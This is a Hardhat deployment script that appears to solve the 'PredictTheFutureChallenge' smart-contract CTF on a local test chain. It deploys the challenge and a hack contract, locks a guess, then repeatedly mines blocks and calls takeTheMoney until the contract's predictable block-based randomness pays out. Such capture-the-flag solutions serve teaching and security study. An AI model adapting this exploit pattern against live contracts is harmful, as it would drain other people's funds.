const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("PredictTheFutureChallenge", deployer);
  const HackContract = await ethers.getContractFactory("PredictTheFutureChallengeHack", deployer);

  const mainContract = await MainContract.deploy({ value: ethers.utils.parseEther("1") });
  const hackContract = await HackContract.deploy(mainContract.address);

  await hackContract.lockGuess(9, { value: ethers.utils.parseEther("1") });

  console.log("Guess locked");

  while (!(await mainContract.isComplete())) {
    await hackContract.mineBlock();
    try {
      await hackContract.takeTheMoney();
    } catch (e) {}
  }

  console.log("Completed");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
